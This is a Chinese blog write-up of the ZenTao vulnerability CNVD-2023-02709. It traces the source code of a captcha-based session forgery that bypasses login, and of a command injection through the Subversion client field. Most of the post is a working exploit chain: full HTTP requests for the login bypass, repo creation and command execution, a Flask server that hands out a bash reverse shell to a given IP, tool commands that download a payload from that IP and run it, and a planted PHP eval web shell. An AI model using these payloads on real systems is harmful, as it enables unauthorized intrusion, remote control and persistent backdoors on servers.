---
title: 禅道CNVD-2023-02709
slug: zentao-cnvd202302709-8wri8
url: /post/zentao-cnvd202302709-8wri8.html
date: '2025-12-17 01:17:28+08:00'
lastmod: '2025-12-19 15:00:08+08:00'
tags:
  - PHP
  - 禅道
keywords: PHP,禅道
toc: true
isCJKLanguage: true
---



![image](http://127.0.0.1:3128/assets/wallhaven-yxd9vk-20251219145625-5g9b07o.png)

# 禅道CNVD-2023-02709

# 一、影响范围

杭州易软共创网络科技有限公司 禅道项目管理系统 >=17.4，<=18.0.beta1（开源版）  
杭州易软共创网络科技有限公司 禅道项目管理系统 >=7.4，<=8.0.beta1（企业版）  
杭州易软共创网络科技有限公司 禅道项目管理系统 >=3.4，<=4.0.beta1（旗舰版）

# 二、漏洞分析

## 2.0 前言

禅道的请求方式有`PATH_INFO`​和`GET`​，可以通过访问`base_url + "?mode=getconfig"`，看是哪种

对于`PATH_INFO`​，uri的形式为`http://8.130.106.245:8080/misc-captcha-user`

对于`GET`​，uri的形式为`http://8.130.106.245:8080/index.php?m=misc&f=captcha&sessionVar=user`  
m表示module文件夹下的路由名字，也就是模型名字  
f表示contorl里的函数，后面的参数就是指函数的参数

## 2.1 登录绕过

### 2.1.1 正常登录逻辑

位于`module/user/model.php`​的`login`函数

```php
    public function login($user, $addAction = true)
    {
        if(!$user) return false;

        $this->cleanLocked($user->account);

        /* Authorize him and save to session. */
        $user->rights = $this->authorize($user->account);
        $user->groups = $this->getGroups($user->account);
        $user->view   = $this->grantUserView($user->account, $user->rights['acls'], $user->rights['projects']);
        $user->admin  = strpos($this->app->company->admins, ",{$user->account},") !== false;

        $this->session->set('user', $user); # 注意这里
        $this->app->user = $this->session->user;
        if(isset($user->id) and $addAction) $this->loadModel('action')->create('user', $user->id, 'login');
        $this->loadModel('score')->create('user', 'login');

        /* Keep login. */
        if($this->post->keepLogin) $this->keepLogin($user);

        return $user;
    }
```

位于`framework/base/router.class.php`​的`set`函数在debug调试中

![image](http://127.0.0.1:3128/assets/image-20251217012251-wrqx4au.png)

可见在正常登录流程中，禅道会将用户登录时，对应的图形验证码作为session中字段user的值， 存储在服务器中

并在cookie中返回zentaosid，作为 session 数据的索引

### 2.1.2 伪造session字段

位于`module/misc/control.php`​的`captcha`函数

```php
    public function captcha($sessionVar = 'captcha', $uuid = '')
    {
        $obLevel = ob_get_level();
        for($i = 0; $i < $obLevel; $i++) ob_end_clean();

        header('Content-Type: image/jpeg');
        $captcha = $this->app->loadClass('captcha');
        $this->session->set($sessionVar, $captcha->getPhrase()); # 注意这里
        $captcha->build()->output();
    }
```

通过访问`http://8.130.106.245:8080/index.php?m=misc&f=captcha&sessionVar=user`​，将`sessionVar`​通过传参，赋值为`user`，可以模拟登录过程，在服务器中伪造一个session，实现登录绕过

## 2.2 命令执行

### 2.2.1 exec与构造函数

位于`lib/scm/subversion.class.php`​的`getSVNVersion`​函数，存在调用`exec`函数，有机会利用

```php
    public function getSVNVersion($client)
    {
        $versionCommand = "$client --version --quiet 2>&1";
        exec($versionCommand, $versionOutput, $versionResult);
        if($versionResult) return false;

        return end($versionOutput);
    }
```

看看这个方法在哪里引用了，发现同php文件里的`Subversion`构造函数有调用

```php
    public function __construct($client, $root, $account, $password, $encoding = 'UTF-8', $repo = null)
    {
        putenv('LC_CTYPE=en_US.UTF-8');
        $this->root     = str_replace(array('%3A', '%2F', '+'), array(':', '/', ' '), urlencode(rtrim($root, '/')));
        $this->account  = $account;
        $this->password = $password;
        $this->encoding = $encoding;
        $this->repo     = $repo;
        $this->ssh      = (stripos($this->root, 'svn') === 0 or stripos($this->root, 'https') === 0) ? true : false;
        $this->remote   = !(stripos($this->root, 'file') === 0);
        $this->client   = $this->remote ? $client . " --username @account@ --password @password@" : $client;
        if($this->encoding == 'utf-8') $this->encoding = 'gbk';

        $this->svnVersion = $this->getSVNVersion($client);
    }
```

因此就需要找到调用构造方法的地方

### 2.2.2 setEngine

根据该构造函数的参数特点，找到位于`lib/scm/scm.class.php`​的`setEngine`函数调用了该构造方法

![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217015818.png)

```php
    public function setEngine($repo)
    {
        $className = $repo->SCM;
        if($className == 'Git') $className = 'GitRepo';
        if(!class_exists($className)) require(strtolower($className) . '.class.php');
        $this->engine = new $className($repo->client, $repo->path, $repo->account, $repo->password, $repo->encoding, $repo);
    }
```

接下来找有哪里调用了`setEngine`函数，筛选条件是函数逻辑相对简单，函数传参好实现。

举一个反例，这种repo参数，很难在post请求中传过去

```php
    public function getRepoTags($repo)
    {
        if(empty($repo->client) or empty($repo->path) or !isset($repo->account) or !isset($repo->password) or !isset($repo->encoding)) return false;

        $scm = $this->app->loadClass('scm');
        $scm->setEngine($repo);
        return $scm->tags('');
    }
```

### 2.2.3 update与edit

位于`module/repo/model.php`​的`update`函数

```php
    public function update($id)
    {
        $repo = $this->getRepoByID($id);
        if(!$this->checkConnection()) return false;

        $isPipelineServer = in_array(strtolower($this->post->SCM), $this->config->repo->gitServiceList) ? true : false;

        $data = fixer::input('post')
            ->setIf($isPipelineServer, 'password', $this->post->serviceToken)
            ->setIf($this->post->SCM == 'Gitlab', 'path', '')
            ->setIf($this->post->SCM == 'Gitlab', 'client', '')
            ->setIf($this->post->SCM == 'Gitlab', 'extra', $this->post->serviceProject)
            ->setDefault('prefix', $repo->prefix)
            ->setIf($this->post->SCM == 'Gitlab', 'prefix', '')
            ->setDefault('client', 'svn')
            ->setDefault('product', '')
            ->skipSpecial('path,client,account,password')
            ->join('product', ',')
            ->setDefault('projects', '')->join('projects', ',')
            ->get();

        if($data->path != $repo->path) $data->synced = 0;

        $data->acl = empty($data->acl) ? '' : json_encode($data->acl);

        if($data->SCM == 'Subversion' and $data->path != $repo->path)
        {
            $scm = $this->app->loadClass('scm'); 
            $scm->setEngine($data);

        /*....不关键代码....*/   
    }
```

只要post传参`if($data->SCM == 'Subversion' and $data->path != $repo->path)`为真即可

根据mvc框架，model层的函数时访问不了的，所以得找一个control层的，调用update的函数

位于`module/repo/control.php`​的函数`edit`

```php
public function edit($repoID, $objectID = 0)
    {
        $this->commonAction($repoID, $objectID);

        $repo = $this->repo->getRepoByID($repoID);
        if($_POST)
        {
            $noNeedSync = $this->repo->update($repoID);

            /*....不关键代码.....*/
     }
```

### 2.2.3 构造一个repo

 为了实现上述利用链，还需构造一个repo，使`setEngine`函数执行时，能有一个repo用

位于`module/repo/control.php`​的函数`create`

```php
    public function create($objectID = 0)
    {
        if($_POST)
        {
            $repoID = $this->repo->create();

     /*............*/
    }
```

调用位于`module/repo/model.php`​的函数`create`

```php
    public function create()
    {
        if(!$this->checkClient()) return false;
        if(!$this->checkConnection()) return false;

        $isPipelineServer = in_array(strtolower($this->post->SCM), $this->config->repo->gitServiceList) ? true : false;

        $data = fixer::input('post')
            ->setIf($isPipelineServer, 'password', $this->post->serviceToken)
            ->setIf($this->post->SCM == 'Gitlab', 'path', '')
            ->setIf($this->post->SCM == 'Gitlab', 'client', '')
            ->setIf($this->post->SCM == 'Gitlab', 'extra', $this->post->serviceProject)
            ->setIf($isPipelineServer, 'prefix', '')
            ->setIf($this->post->SCM == 'Git', 'account', '')
            ->setIf($this->post->SCM == 'Git', 'password', '')
            ->skipSpecial('path,client,account,password')
            ->setDefault('product', '')
            ->join('product', ',')
            ->setDefault('projects', '')->join('projects', ',')
            ->get();

        $data->acl = empty($data->acl) ? '' : json_encode($data->acl);
        if($data->SCM == 'Subversion')
        {
            $scm = $this->app->loadClass('scm');
            $scm->setEngine($data);
            $info     = $scm->info('');
            $infoRoot = urldecode($info->root);
            $data->prefix = empty($infoRoot) ? '' : trim(str_ireplace($infoRoot, '', str_replace('\\', '/', $data->path)), '/');
            if($data->prefix) $data->prefix = '/' . $data->prefix;
        }

        if($data->encrypt == 'base64') $data->password = base64_encode($data->password);
        $this->dao->insert(TABLE_REPO)->data($data, $skip = 'serviceToken')
            ->batchCheck($this->config->repo->create->requiredFields, 'notempty')
            ->batchCheckIF($data->SCM != 'Gitlab', 'path,client', 'notempty')
            ->batchCheckIF($isPipelineServer, 'serviceHost,serviceProject', 'notempty')
            ->batchCheckIF($data->SCM == 'Subversion', $this->config->repo->svn->requiredFields, 'notempty')
            ->check('name', 'unique', "`SCM` = '{$data->SCM}'")
            ->checkIF($isPipelineServer, 'serviceProject', 'unique', "`SCM` = '{$data->SCM}' and `serviceHost` = '{$data->serviceHost}'")
            ->checkIF(!$isPipelineServer, 'path', 'unique', "`SCM` = '{$data->SCM}' and `serviceHost` = '{$data->serviceHost}'")
            ->autoCheck()
            ->exec();

        if(dao::isError()) return false;

        $this->rmClientVersionFile();

        $repoID = $this->dao->lastInsertID();

        if($this->post->SCM == 'Gitlab')
        {
            /* Add webhook. */
            $repo = $this->getRepoByID($repoID);
            $this->loadModel('gitlab')->addPushWebhook($repo);
        }

        return $repoID;
    }
```

通过该方法创建一个repo，具体见PoC

# 三、PoC

## 3.1 伪造session

```http
GET /misc-captcha-user HTTP/1.1
Host: 8.130.106.245:8080
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
HTTP_SEC_FETCH_DEST: frame
Referer:http://8.130.106.245:8080/index.php?m=user&f=login&referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM=
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Length: 2
```

![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217023455.png)

## 3.2 创建repo

```http
POST /repo-create.html HTTP/1.1
Host: 8.130.106.245:8080
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Referer:http://8.130.106.245:8080/index.php?m=user&f=login&referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM=
Cookie: zentaosid=898j16uh93p7kvvca97uget3fu; lang=zh-cn; device=desktop; theme=default
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

SCM=Gitlab&name=hacker1&product=hacker1
```

![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217030510.png)

## 3.3 命令执行

```http
POST /repo-edit-22 HTTP/1.1
Host: 8.130.106.245:8080
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Referer:http://8.130.106.245:8080/index.php?m=user&f=login&referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM=
X-Requested-With: XMLHttpRequest
Cookie: zentaosid=898j16uh93p7kvvca97uget3fu; lang=zh-cn; device=desktop; theme=default; windowWidth=1024; windowHeight=924
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

SCM=Subversion&client='pwd';
```

![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217030534.png)

# 四、EXP

## 4.0 前言

在PoC中发现，直接反弹shell并不行，故尝试别的方案

## 4.1 getshell

搭建flask服务

```python
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/')
def root():
    return '/bin/bash -i >& /dev/tcp/8.140.232.215/33113 0>&1'

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217033418.png)

![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217033500.png)

![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217033622.png)

也可以用一下工具https://github.com/0xf4n9x/Zentao-Captcha-RCE

```python
cnvd-2023-02709.exe -u http://8.130.106.245:8080/ -c "curl 8.140.232.215:80 -o /tmp/moxbbzz"
cnvd-2023-02709.exe -u http://8.130.106.245:8080/ -c "chmod +x /tmp/moxbbzz"
cnvd-2023-02709.exe -u http://8.130.106.245:8080/ -c "/bin/bash /tmp/moxbbzz"
```

## 4.2 植入木马

```python
echo '<?php eval($_POST[1]);?>' > shell.php
```

![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217033915.png)

![image](https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217034606.png)
